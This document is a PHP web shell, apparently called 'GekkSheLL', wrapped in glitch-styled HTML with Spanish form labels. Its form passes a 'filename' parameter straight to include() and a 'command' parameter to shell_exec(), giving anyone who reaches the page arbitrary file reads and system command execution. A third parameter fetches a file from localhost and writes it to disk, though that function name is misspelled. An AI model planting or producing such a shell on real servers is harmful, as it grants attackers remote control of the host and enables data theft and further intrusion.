<html>
    <title>buzzerage</title>
    <head>
        <style>
            pre {
                color: white;
                font-size:15px;
                margin-left: 30px;
            }

            hr {
                color: #aaff62;
                width: 1400;
                overflow: visible;
                height: 30px;
                border-style: solid;
                border-color: #aaff62;
                border-width: 1px 0 0 0;
                border-radius: 20px;
            }
            hr::before {
                width:1400;
                display: block;
                content: "";
                height: 30px;
                margin-top: -31px;
                border-style: solid;
                border-color: #aaff62;
                border-width: 0 0 1px 0;
                border-radius: 20px;
            }
            @keyframes noise{
                0%{background-position:950px;}
            }
            html, body {
                min-height: 100%;
                margin: 0;
                background:#28313b;
            }
            .glitch-wrapper{
                padding-top:80px;
                width:100vw;
                text-align:center;
                animation:glitch 2s linear infinite;
                margin-bottom:110px;
            }

            .glitch-text{
                font-family: monospace;
                font-weight:bold;
            }

            .glitch-text::before{
                content:'GekkSheLL';
                color:#63D471;
                text-shadow:0px 0px 5px 10px black!IMPORTANT;
                -webkit-filter: blur(7px);
                -moz-filter: blur(7px);
                -o-filter: blur(7x);
                -ms-filter: blur(7px);
                filter: blur(7px);
                display:block;
                position:absolute;
                z-index:-1;
                font-size:132px;
                left:0px;
                right:0px;
                margin-top:-30px;
                opacity:.75;
            }

            .glitch-text{
                position:relative;
                z-index:2;
                opacity:.9;
                margin:0 auto;
                text-shadow:0px 0px 3px white;
                animation:glitch 3s infinite;
                cursor:pointer;
                font-size:52px;
                color:white;
            }

            .paused{
                animation-play-state: paused;
            }

            /* JUST RANDOM VALUES HERE! */
            @keyframes glitch{
                3%{text-shadow:7px 7px 0px red;}
                6%{text-shadow:-9px 4px 0px blue;transform:translate(4px,-10px) skewX(240deg);}
                7%{text-shadow:3px -4px 0px green;}
                9%{text-shadow:0px 0px 3px white;transform:translate(0px,0px) skewX(0deg);}
                2% , 54%{transform:translateX(0px) skew(0deg);}
                55%{transform:translate(-2px,6px) skew(-530deg);}
                56%{text-shadow:0px 0px 3px white;transform:translate(0px,0px) skew(0deg);}
                57%{text-shadow:7px 7px 0px red;transform:translate(4px,-10px) skew(-70deg);}
                58%{text-shadow:0px 0px 3px white;transform:translate(0px,0px) skew(0deg);}
                62%{text-shadow:3px -4px 0px green;transform:translate(0px,20px) skew(0deg);}
                63%{text-shadow:0px 0px 3px white;transform:translate(4px,-2px) skew(0deg);}
                64%{transform:translate(1px,3px); skew(-230deg);}
                65%{transform:translate(-7px,2px); skew(120deg);}
                66%{transform:translate(0px,0px) skew(0deg);}
            } 

            input[type=text], select {
                padding: 12px 20px;
                margin: 8px 0;
                display: inline-block;
                border: 1px solid #ccc;
                border-radius: 4px;
                box-sizing: border-box;
            }

            input[type=submit] {
                background-color: #63D471;
                color: white;
                padding: 14px 20px;
                margin: 8px 0;
                border: none;
                border-radius: 4px;
                cursor: pointer;
            }

            input[type=submit]:hover {
                background-color: #53ab5e;
            }

        </style>
        <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet" type="text/css">
    </head>
    <body>
        <div class="glitch-wrapper"><div class="glitch-text"> <a rollapp-href=""><small><small><small><span style="color: red;"><img alt="" image_download_for_instagram="true"></span></small></small></small></a><small><small><small> </small></small></small></div></div>
        <hr>
        <center><form method="GET" name="<?php basename($_SERVER['PHP_SELF']); ?>">
            <input type="text" name="filename" id="filename" size="30">
            <input type="submit" value="Archivo">
            &nbsp
            <input type="text" name="command" id="command" size="40">
            <input type="submit" value="Ejecutar">
            &nbsp
            <input type="text" name="fupload" id="fupload" size="20">
            <input type="submit" value="Subir">
        </form></center>
        <hr>
        <?php 
            if(isset($_GET['filename'])){
                echo "<pre>";
                include($_GET['filename']);
                echo "</pre>";
            };
            if(isset($_GET['command'])){
                echo "<pre>" . shell_exec($_GET['command']) . "</pre>";
            };
            if(isset($_GET['fupload'])){
                file_put_contesnts($_GET['fupload'], file_get_contents("http://127.0.0.1:80/" . $_GET['fupload']));
            };
        ?>
    </body>
</html>